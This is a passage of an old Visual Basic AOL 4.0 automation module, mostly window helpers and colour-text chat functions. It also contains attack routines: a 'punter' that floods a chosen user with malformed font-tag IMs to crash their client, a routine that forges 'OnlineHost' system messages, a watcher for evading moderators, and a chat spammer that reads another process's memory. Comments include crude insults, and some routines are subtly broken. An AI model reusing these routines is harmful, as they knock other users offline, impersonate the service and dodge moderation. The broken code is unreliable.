firss% = GetWindow(FindChildByClass(AOLWindow(), "MDIClient"), 5)
forw% = FindChildByTitle(firss%, "Send Now")
If forw% <> 0 Then GoTo begis
firs% = GetWindow(firs%, 2)
forw% = FindChildByTitle(firs%, "Send Now")
If forw% <> 0 Then GoTo bone
If dosloop = 1 Then Exit Do
Loop
Exit Function
bone:
FindSendWin = firs%

Exit Function
begis:
FindSendWin = firss%
End Function
Function FindForwardWindow()
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
childfocus% = GetWindow(MDI%, 5)

While childfocus%
listers% = FindChildByTitle(childfocus%, "Send Now")
listere% = FindChildByClass(childfocus%, "_AOL_Icon")
listerb% = FindChildByClass(childfocus%, "_AOL_Button")

If listers% <> 0 And listere% <> 0 And listerb% <> 0 Then FindForwardWindow = childfocus%: Exit Function
childfocus% = GetWindow(childfocus%, 2)
Wend
End Function

Function FindFwdWin(dosloop)
'FindFwdWin = GetParent(FindChildByTitle(FindChildByClass(AOLMDI(), "AOL Child"), "Forward"))
'Exit Function
firs% = GetWindow(FindChildByClass(AOLWindow(), "MDIClient"), 5)
forw% = FindChildByTitle(firs%, "Forward")
If forw% <> 0 Then GoTo bone
firs% = GetWindow(FindChildByClass(AOLWindow(), "MDIClient"), GW_CHILD)

Do: DoEvents
firss% = GetWindow(FindChildByClass(AOLWindow(), "MDIClient"), 5)
forw% = FindChildByTitle(firss%, "Forward")
If forw% <> 0 Then GoTo begis
firs% = GetWindow(firs%, 2)
forw% = FindChildByTitle(firs%, "Forward")
If forw% <> 0 Then GoTo bone
If dosloop = 1 Then Exit Do
Loop
Exit Function
bone:
FindFwdWin = firs%

Exit Function
begis:
FindFwdWin = firss%
End Function



Function AOLWindow()
AOL% = FindWindow("AOL Frame25", vbNullString)
AOLWindow = AOL%
End Function

Function AOLActivate()
X = GetCaption(AOLWindow)
AppActivate X
End Function

Function Mail_ListMail(Box As ListBox)
Box.Clear
AOLMDI
MailWin = FindChildByTitle(AOLMDI, "New Mail")
If MailWin = 0 Then
AOLRunMenuByString ("Read &New Mail")
Justamin:
MailWin = FindChildByTitle(AOLMDI, "New Mail")
If MailWin = 0 Then GoTo Justamin
Timeout (7)
End If

MailWin = FindChildByTitle(AOLMDI, "New Mail")
AOLCountMail
start:
If Counter = AOLCountMail Then GoTo last
mailtree = FindChildByClass(MailWin, "_AOL_TREE")
   namelen = SendMessage(mailtree, LB_GETTEXTLEN, Counter, 0)
    Buffer$ = String$(namelen, 0)
    X = SendMEssageByString(mailtree, LB_GETTEXT, Counter, Buffer$)
    TabPos = InStr(Buffer$, Chr$(9))
    Buffer$ = Right$(Buffer$, (Len(Buffer$) - (TabPos)))
    Box.AddItem Buffer$
 Timeout (0.001)
Counter = Counter + 1
GoTo start
last:
End Function
Sub AOLRunMenuByString(stringer As String)
Call RunMenuByString(AOLWindow(), stringer)
End Sub

Public Function AOLSupRoom()
'used for a sup bot
If IsUserOnline = 0 Then GoTo last
FindChatRoom
If FindChatRoom = 0 Then GoTo last

On Error Resume Next

Dim AOLProcess As Long
Dim ListItemHold As Long
Dim person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
    

Room = FindChatRoom()
aolhandle = FindChildByClass(Room, "_AOL_Listbox")

AOLThread = GetWindowThreadProcessId(aolhandle, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)

If AOLProcessThread Then
For Index = 0 To SendMessage(aolhandle, LB_GETCOUNT, 0, 0) - 1
person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(aolhandle, LB_GETITEMDATA, ByVal CLng(Index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, person$, 4, ReadBytes)
                        
Call RtlMoveMemory(ListPersonHold, ByVal person$, 4)
ListPersonHold = ListPersonHold + 6

person$ = String$(16, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, person$, Len(person$), ReadBytes)

person$ = Left$(person$, InStr(person$, vbNullChar) - 1)
Call SendChat("HeY! " & person$ & " WaZ uP?")
Timeout (0.5)
Next Index
Call CloseHandle(AOLProcessThread)
End If
last:
End Function
Sub AOLSetText(win, txt)
TheText% = SendMEssageByString(win, WM_SETTEXT, 0, txt)
End Sub

Public Sub AOLKillWindow(Windo)
X = sendmessagebynum(Windo, WM_CLOSE, 0, 0)
End Sub

Sub AOLHostManipulator(What$)
'a good sub but kinda old style
'Example.... AOLHostManipulator "You are gay"
'This will make the online host say you are gay!
View% = FindChildByClass(AOLFindRoom(), "_AOL_View")
Buffy$ = Chr$(13) & Chr$(10) & "OnlineHost:" & Chr$(9) & "" & (What$) & ""
X% = SendMEssageByString(View%, WM_SETTEXT, 0, Buffy$)
End Sub
Sub AOLGuideWatch()
'a good sub but kinda old style
Do
    Y = DoEvents()
For Index% = 0 To 25
namez$ = String$(256, " ")
If Len(Trim$(namez$)) <= 1 Then GoTo end_ad
namez$ = Left$(Trim$(namez$), Len(Trim(namez$)) - 1)
X = InStr(LCase$(namez$), LCase$("guide"))
If X <> 0 Then
Call Keyword("PC")
MsgBox "A Guide had entered the room."
End If
Next Index%
end_ad:
Loop
End Sub

Function AOLFindRoom()
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
childfocus% = GetWindow(MDI%, 5)

While childfocus%
listers% = FindChildByClass(childfocus%, "_AOL_Edit")
listere% = FindChildByClass(childfocus%, "_AOL_View")
listerb% = FindChildByClass(childfocus%, "_AOL_Listbox")

If listers% <> 0 And listere% <> 0 And listerb% <> 0 Then AOLFindRoom = childfocus%: Exit Function
childfocus% = GetWindow(childfocus%, 2)
Wend
End Function
Function AOLGetUser()
On Error Resume Next
AOL% = FindWindow("AOL Frame25", "America  Online")
MDI% = FindChildByClass(AOL%, "MDIClient")
welcome% = FindChildByTitle(MDI%, "Welcome, ")
WelcomeLength% = GetWindowTextLength(welcome%)
WelcomeTitle$ = String$(200, 0)
A% = GetWindowText(welcome%, WelcomeTitle$, (WelcomeLength% + 1))
User = Mid$(WelcomeTitle$, 10, (InStr(WelcomeTitle$, "!") - 10))
AOLGetUser = User
End Function
Function AOLGetChat()

child = FindChildByClass(childs%, "_AOL_View")

GetTrim = sendmessagebynum(child, 14, 0&, 0&)
TrimSpace$ = Space$(GetTrim)
getstring = SendMEssageByString(child, 13, GetTrim + 1, TrimSpace$)

theview$ = TrimSpace$
AOLGetChat = theview$
End Function

Sub AOLChatPunter(SN1 As TextBox, Bombs As TextBox)
'This will see if somebody types /Punt: in a chat
'room...then punt the SN they put.
On Error GoTo errhandler
GINA69 = AOLGetUser
GINA69 = UCase(GINA69)

heh$ = AOLLastChatLine
heh$ = UCase(heh$)
naw$ = Mid(heh$, InStr(heh$, ":") + 2)
Timeout (0.3)
SN = Mid(naw$, InStr(naw$, ":") + 1)
SN = UCase(SN)
Timeout (0.3)
pntstr = Mid$(naw$, 1, (InStr(naw$, ":") - 1))
Gina = pntstr
If Gina = "/PUNT" Then
SN1 = SN
If SN1 = GINA69 Or SN1 = " " + GINA69 Or SN1 = "  " + GINA69 Or SN1 = "   " + GINA69 Or SN1 = "     " + GINA69 Or SN1 = "      " + GINA69 Then
SN1 = AOLGetSNfromCHAT
    BoldPurpleRed "· ···•(\›•    Room Punter"
    BoldPurpleRed "· ···•(\›•    I can't punt myself BITCH!"
    BoldPurpleRed "· ···•(\›•    Now U Get PUNTED!"
    GoTo JAKC
    Timeout (1)
Exit Sub
End If
    GoTo SendITT
Else
    Exit Sub
End If
SendITT:
BoldPurpleRed "· ···•(\›•    Room punt"
BoldPurpleRed "· ···•(\›•    Request Noted"
BoldPurpleRed "· ···•(\›•    Now †h®åShîng - " + SN1
BoldPurpleRed "· ···•(\›•    Punting With - " + Bombs + " IMz"
JAKC:
Call IMsOff
Do
Call IMKeyword(SN1, "</P><P ALIGN=CENTER><font = 9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999>")
Bombs = Str(Val(Bombs - 1))
If FindWindow("#32770", "Aol canada") <> 0 Then Exit Sub: MsgBox "This User is not currently signed on, or his/her IMz are Off."
Loop Until Bombs <= 0
Call IMsOn
Bombs = "10"
errhandler:
    Exit Sub
End Sub

Public Sub AOLButton(but%)
Clicicon% = SendMessage(but%, WM_KEYDOWN, VK_SPACE, 0)
Clicicon% = SendMessage(but%, WM_KEYUP, VK_SPACE, 0)
End Sub

Sub AOLBuddyBLOCK(SN As TextBox)
BUDLIST% = FindChildByTitle(AOLMDI(), "Buddy List Window")
Locat% = FindChildByClass(BUDLIST%, "_AOL_ICON")
Im1% = GetWindow(Locat%, GW_HWNDNEXT)
Setup% = GetWindow(Im1%, GW_HWNDNEXT)
ClickIcon (Setup%)
Timeout (2)
STUPSCRN% = FindChildByTitle(AOLMDI(), AOLGetUser & "'s Buddy Lists")
Creat% = FindChildByClass(STUPSCRN%, "_AOL_ICON")
Edit% = GetWindow(Creat%, GW_HWNDNEXT)
Delete% = GetWindow(Edit%, GW_HWNDNEXT)
View% = GetWindow(Delete%, GW_HWNDNEXT)
PRCYPREF% = GetWindow(View%, GW_HWNDNEXT)
ClickIcon PRCYPREF%
Timeout (1.8)
Call AOLKillWindow(STUPSCRN%)
Timeout (2)
PRYVCY% = FindChildByTitle(AOLMDI(), "Privacy Preferences")
DABUT% = FindChildByTitle(PRYVCY%, "Block only those people whose screen names I list")
AOLButton (DABUT%)
DaPERSON% = FindChildByClass(PRYVCY%, "_AOL_EDIT")
Call AOLSetText(DaPERSON%, SN)
Creat% = FindChildByClass(PRYVCY%, "_AOL_ICON")
Edit% = GetWindow(Creat%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
ClickIcon Edit%
Timeout (1)
Save% = GetWindow(Edit%, GW_HWNDNEXT)
Save% = GetWindow(Save%, GW_HWNDNEXT)
Save% = GetWindow(Save%, GW_HWNDNEXT)
ClickIcon Save%
End Sub
Sub AOLAntiPunter()
Do
ANT% = FindChildByTitle(AOLMDI(), "Untitled")
IMRICH% = FindChildByClass(ANT%, "RICHCNTL")
STS% = FindChildByClass(ANT%, "_AOL_Static")
st% = GetWindow(STS%, GW_HWNDNEXT)
st% = GetWindow(st%, GW_HWNDNEXT)
Call AOLSetText(st%, "Ritual2x¹ - This IM Window Should Remain OPEN.")
mi = showwindow(ANT%, SW_MINIMIZE)
DoEvents:
If IMRICH% <> 0 Then
Lab = sendmessagebynum(IMRICH%, WM_CLOSE, 0, 0)
Lab = sendmessagebynum(IMRICH%, WM_CLOSE, 0, 0)
End If
Loop
End Sub

Function Mail_MailCaption()
FindOpenMail
Mail_MailCaption = GetCaption(FindOpenMail)
End Function


Function FindOpenMail()
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
childfocus% = GetWindow(MDI%, 5)

While childfocus%
listers% = FindChildByClass(childfocus%, "RICHCNTL")
listere% = FindChildByClass(childfocus%, "_AOL_Icon")
listerb% = FindChildByClass(childfocus%, "_AOL_Button")

If listers% <> 0 And listere% <> 0 And listerb% <> 0 Then FindOpenMail = childfocus%: Exit Function
childfocus% = GetWindow(childfocus%, 2)
Wend


End Function


Sub AntiIdle()
'use this sub in a timer set at 100
AOModal% = FindWindow("_AOL_Modal", vbNullString)
AOIcon% = FindChildByClass(AOModal%, "_AOL_Icon")
ClickIcon (AOIcon%)
End Sub

Sub AOL4_Invite(person)
'This will send an Invite to a person
'werks good for a pinter if u use a timer
FreeProcess
On Error GoTo errhandler
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
bud% = FindChildByTitle(MDI%, "Buddy List Window")
E = FindChildByClass(bud%, "_AOL_Icon")
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
ClickIcon (E)
Timeout (1#)
Chat% = FindChildByTitle(MDI%, "Buddy Chat")
aoledit% = FindChildByClass(Chat%, "_AOL_Edit")
If Chat% Then GoTo FILL
FILL:
Call AOL4_SetText(aoledit%, person)
de = FindChildByClass(Chat%, "_AOL_Icon")
ClickIcon (de)
Killit% = FindChildByTitle(MDI%, "Invitation From:")
AOL4_KillWin (Killit%)
FreeProcess
errhandler:
Exit Sub
End Sub
Function LeetYellowPinkYellow(Text1)
A = Len(Text1)
For B = 1 To A
C = Left(Text1, B)
D = Right(C, 1)
E = 510 / A
f = E * B
If f > 255 Then f = (255 - (f - 255))
G = RGB(78, 255 - f, 255)
H = RGBtoHEX(G)
Msg = Msg & "<Font Color=#" & H & ">" & D
Next B
EliteTalker (Msg)
End Function


Function hackerYellowPinkYellow(Text1)
A = Len(Text1)
For B = 1 To A
C = Left(Text1, B)
D = Right(C, 1)
E = 510 / A
f = E * B
If f > 255 Then f = (255 - (f - 255))
G = RGB(78, 255 - f, 255)
H = RGBtoHEX(G)
Msg = Msg & "<Font Color=#" & H & ">" & D
Next B
r_hacker (Msg)
End Function


Sub AOL4_KillWin(Windo)
'Closes a window....ex: AOL4_Killwin (IM%)
CloseTheMofo = sendmessagebynum(Windo, WM_CLOSE, 0, 0)
End Sub



Function Mail_Out_CloseMail()
AOL% = FindWindow("AOL Frame25", vbNullString)
A2000% = FindChildByClass(AOL%, "MDIClient")
A3000% = FindChildByTitle(A2000%, "Outgoing FlashMail")
End Function


Function Mail_Out_CursorSet(mailIndex As String)
AOL% = FindWindow("AOL Frame25", vbNullString)
A2000% = FindChildByClass(AOL%, "MDIClient")
A3000% = FindChildByTitle(A2000%, "Outgoing FlashMail")
mailtree% = FindChildByClass(A3000%, "_AOL_Tree")
A6000% = SendMEssageByString(mailtree%, LB_SETCURSEL, mailIndex, 0)
End Function

Function Mail_Out_ListMail(Box As ListBox)
Box.Clear
AOLMDI
MailWin = FindChildByTitle(AOLMDI, "New Mail")
If MailWin = 0 Then
AOLRunMenuByString ("Read &New Mail")
Justamin:
MailWin = FindChildByTitle(AOLMDI, "New Mail")
If MailWin = 0 Then GoTo Justamin
Timeout (7)
End If

MailWin = FindChildByTitle(AOLMDI, "Outgoing FlashMail")
AOLCountMail
start:
If Counter = AOLCountMail Then GoTo last
mailtree = FindChildByClass(MailWin, "_AOL_TREE")
   namelen = SendMessage(mailtree, LB_GETTEXTLEN, Counter, 0)
    Buffer$ = String$(namelen, 0)
    X = SendMEssageByString(mailtree, LB_GETTEXT, Counter, Buffer$)
    TabPos = InStr(Buffer$, Chr$(9))
    Buffer$ = Right$(Buffer$, (Len(Buffer$) - (TabPos)))
    Box.AddItem Buffer$
 Timeout (0.001)
Counter = Counter + 1
GoTo start
last:
End Function

Function Mail_Out_MailCaption()
End Function


Function Mail_Out_MailCount()
theMail% = FindChildByClass(AOLMDI(), "AOL Child")
thetree% = FindChildByClass(theMail%, "_AOL_Tree")
Mail_Out_MailCount = SendMessage(thetree%, LB_GETCOUNT, 0, 0)
End Function


Function Mail_Out_PressEnter()
AOL% = FindWindow("AOL Frame25", vbNullString)
A2000% = FindChildByClass(AOL%, "MDIClient")
A3000% = FindChildByTitle(A2000%, "Outgoing FlashMail")
mailtree% = FindChildByClass(A3000%, "_AOL_Tree")
X = SendMessage(mailtree%, WM_KEYDOWN, VK_RETURN, 0)
X = SendMessage(mailtree%, WM_KEYUP, VK_RETURN, 0)
End Function



Function Mail_SetCursor(mailIndex As String)
AOL% = FindWindow("AOL Frame25", vbNullString)
A2000% = FindChildByClass(AOL%, "MDIClient")
A3000% = FindChildByTitle(A2000%, "New Mail")
mailtree% = FindChildByClass(A3000%, "_AOL_Tree")
A6000% = SendMEssageByString(mailtree%, LB_SETCURSEL, mailIndex, 0)
End Function

Sub NotOnTop(the As Form)
'This will take a form and make it so that
'it does not stay on top of other forms
'U HAVE TO MAKE THE EXE to SEE IT WERK

SetWinOnTop = SetWindowPos(the.hwnd, HWND_NOTOPMOST, 0, 0, 0, 0, Flags)
End Sub
Sub PhreakyAttention(Text)

SendChat ("<b>¤</b><i> ¤</i><u> ¤</u><s> ¤</s> " & Text & " <s>¤</s><u> ¤</u><i> ¤</i><b> ¤</b>")
SendChat ("<B>" & Text)
SendChat ("<I>" & Text)
SendChat ("<U>" & Text)
SendChat ("<S>" & Text)
SendChat ("<b>¤</b><i> ¤</i><u> ¤</u><s> ¤</s> " & Text & " <s>¤</s><u> ¤</u><i> ¤</i><b> ¤</b>")
End Sub

Function PinkOrange(Text1)
    A = Len(Text1)
    For B = 1 To A
        C = Left(Text1, B)
        D = Right(C, 1)
        E = 200 / A
        f = E * B
        G = RGB(255 - f, 167, 510)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    PinkOrange = Msg
End Function


Function PinkOrangePink(Text1)
    A = Len(Text1)
    For B = 1 To A
        C = Left(Text1, B)
        D = Right(C, 1)
        E = 490 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 167, 510)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    PinkOrangePink = Msg
End Function

Function BoldLBlue_Orange(Text1)
    A = Len(Text1)
    For B = 1 To A
        C = Left(Text1, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(255 - f, 155, f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    LBlue_Orange (Msg)
End Function




Function BoldLBlue_Orange_LBlue(Text1)
    A = Len(Text1)
    For B = 1 To A
        C = Left(Text1, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 155, f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    LBlue_Orange_LBlue (Msg)
End Function


Function BoldLBlue_Yellow_LBlue(Text1)
    A = Len(Text1)
    For B = 1 To A
        C = Left(Text1, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    LBlue_Yellow_LBlue (Msg)
End Function


Function BoldLGreen_DGreen(Text1)
    A = Len(Text1)
    For B = 1 To A
        C = Left(Text1, B)
        D = Right(C, 1)
        E = 220 / A
        f = E * B
        G = RGB(0, 375 - f, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    LGreen_DGreen (Msg)
End Function


Function BoldLGreen_DGreen_LGreen(Text1)
    A = Len(Text1)
    For B = 1 To A
        C = Left(Text1, B)
        D = Right(C, 1)
        E = 490 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 375 - f, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    LGreen_DGreen_LGreen (Msg)
End Function


Function BoldPinkOrange(Text1)
    A = Len(Text1)
    For B = 1 To A
        C = Left(Text1, B)
        D = Right(C, 1)
        E = 200 / A
        f = E * B
        G = RGB(255 - f, 167, 510)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    BoldSendChat (Msg)
End Function


Function BoldPinkOrangePink(Text1)
    A = Len(Text1)
    For B = 1 To A
        C = Left(Text1, B)
        D = Right(C, 1)
        E = 490 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 167, 510)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    BoldSendChat (Msg)
End Function

Function BoldPurple_LBlue_Purple()
    A = Len(Text1)
    For B = 1 To A
        C = Left(Text1, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, f, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
  BoldSendChat (Msg)
End Function


Function BoldPurpleBlack(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(255 - f, 0, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
BoldSendChat (Msg)
End Function


Function BoldPurpleBlackPurple(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "<B><Font Color=#" & H & ">" & D
    Next B
BoldSendChat (Msg)
End Function

Function BoldPurpleBlue(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(255, 0, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
 BoldSendChat (Msg)
End Function


Function BoldPurpleBluePurple(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 0, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "<B><Font Color=#" & H & ">" & D
    Next B
 BoldSendChat (Msg)
End Function


Function BoldPurpleGreen(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(255 - f, f, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
BoldSendChat (Msg)
End Function


Function BoldPurpleGreenPurple(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "<B><Font Color=#" & H & ">" & D
    Next B
 BoldSendChat (Msg)
End Function

Function BoldPurpleRed(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(255 - f, 0, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
BoldSendChat (Msg)
End Function


Function BoldPurpleRedPurple(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
BoldSendChat (Msg)
End Function


Function BoldPurpleWhite(Text1)
    A = Len(Text1)
    For B = 1 To A
        C = Left(Text1, B)
        D = Right(C, 1)
        E = 200 / A
        f = E * B
        G = RGB(255, f, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    BoldSendChat (Msg)
End Function


Function BoldPurpleWhitePurple(Text1)
    A = Len(Text1)
    For B = 1 To A
        C = Left(Text1, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, f, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
  BoldSendChat (Msg)
End Function


Function BoldPurpleYellow(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(255 - f, f, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
BoldSendChat (Msg)
End Function


Sub AOL4_SetFocus()
X = GetCaption(AOLWindow)
AppActivate X
End Sub
Sub AOL4_SetText(win, txt)
'This is usually used for an _AOL_Edit or RICHCNTL
TheText% = SendMEssageByString(win, WM_SETTEXT, 0, txt)
End Sub


Function AOL4_WavColors3(Text1 As String)

End Function

Function AOL4_UpChat()
'this is an upchat that minimizes the
'upload window
die% = FindWindow("_AOL_MODAL", vbNullString)
X = showwindow(die%, SW_HIDE)
X = showwindow(die%, SW_MINIMIZE)
Call AOL4_SetFocus
End Function

Sub AOL4_UnUpChat()
die% = FindWindow("_AOL_MODAL", vbNullString)
X = showwindow(die%, SW_RESTORE)
Call AOL4_SetFocus
End Sub

Sub AOL40_Load()
'This will load AOL4.0
X% = Shell("C:\aol40\waol.exe", 1): NoFreeze% = DoEvents(): Exit Sub
X% = Shell("C:\aol40a\waol.exe", 1): NoFreeze% = DoEvents(): Exit Sub
X% = Shell("C:\aol40b\waol.exe", 1): NoFreeze% = DoEvents(): Exit Sub
X% = Shell("C:\America Online 4.0\waol.exe", 1): NoFreeze% = DoEvents(): Exit Sub
X% = Shell("C:\America Online\waol.exe", 1): NoFreeze% = DoEvents(): Exit Sub
X% = Shell("C:\Program Files\Online Services\America Online\waol.exe", 1): NoFreeze% = DoEvents(): Exit Sub
X% = Shell("C:\aol\waol.exe", 1): NoFreeze% = DoEvents(): Exit Sub

End Sub

Public Sub SCROLLeightline(txt As TextBox)
'a simple 8 line scroller
A = String(116, Chr(32))
D = 116 - Len(txt)
C$ = Left(A, D)
SendChat "" + Text1.Text + "" & C$ & "" + Text1.Text + ""

SendChat "" + Text1.Text + "" & C$ & "" + Text1.Text + ""

SendChat "" + Text1.Text + "" & C$ & "" + Text1.Text + ""

SendChat "" + Text1.Text + "" & C$ & "" + Text1.Text + ""
Timeout 2

End Sub
Public Sub SCROLLfifteenline(txt As TextBox)
A = String(116, Chr(32))
D = 116 - Len(txt)
C$ = Left(A, D)
SendChat "" + Text1.Text + "" & C$ & "" + Text1.Text + ""
Timeout 0.3
SendChat "" + Text1.Text + "" & C$ & "" + Text1.Text + ""
Timeout 0.3
SendChat "" + Text1.Text + "" & C$ & "" + Text1.Text + ""
Timeout 0.3
SendChat "" + Text1.Text + "" & C$ & "" + Text1.Text + ""
Timeout 1.5
SendChat "" + Text1.Text + "" & C$ & "" + Text1.Text + ""
Timeout 0.3
SendChat "" + Text1.Text + "" & C$ & "" + Text1.Text + ""
Timeout 0.3
SendChat "" + Text1.Text + "" & C$ & "" + Text1.Text + ""
Timeout 0.3
SendChat "" + Text1.Text + "" & C$
Timeout 1.5
End Sub
Function AOLMDI()
AOL% = FindWindow("AOL Frame25", vbNullString)
AOLMDI = FindChildByClass(AOL%, "MDIClient")
End Function
Function AOLCountMail()
theMail% = FindChildByClass(AOLMDI(), "AOL Child")
thetree% = FindChildByClass(theMail%, "_AOL_Tree")
AOLCountMail = SendMessage(thetree%, LB_GETCOUNT, 0, 0)
End Function
Public Sub AOLIcons()
AOL% = FindWindow("AOL Frame25", vbNullString)
TL1% = FindChildByClass(AOL%, "AOL Toolbar")
TL2% = FindChildByClass(TL1%, "_AOL_Toolbar")
ICO1% = FindChildByClass(TL2%, "_AOL_Icon")
ICO2% = GetWindow(ICO1%, 2)
ICO3% = GetWindow(ICO2%, 2)
ICO4% = GetWindow(ICO3%, 2)
ICO5% = GetWindow(ICO4%, 2)
ICO6% = GetWindow(ICO5%, 2)
ICO7% = GetWindow(ICO6%, 2)
ICO8% = GetWindow(ICO7%, 2)
ICO9% = GetWindow(ICO8%, 2)
ICO10% = GetWindow(ICO9%, 2)
ICO11% = GetWindow(ICO10%, 2)
ICO12% = GetWindow(ICO11%, 2)
ICO13% = GetWindow(ICO12%, 2)
ICO14% = GetWindow(ICO13%, 2)
ICO15% = GetWindow(ICO14%, 2)
ICO16% = GetWindow(ICO15%, 2)
ICO17% = GetWindow(ICO16%, 2)
ICO18% = GetWindow(ICO17%, 2)
ICO19% = GetWindow(ICO18%, 2)
ICO20% = GetWindow(ICO19%, 2)
ICO21% = GetWindow(ICO20%, 2)
ICO22% = GetWindow(ICO21%, 2)
ICO23% = GetWindow(ICO22%, 2)
ICO24% = GetWindow(ICO23%, 2)
ICO25% = GetWindow(ICO24%, 2)
ICO26% = GetWindow(ICO25%, 2)
ICO27% = GetWindow(ICO26%, 2)
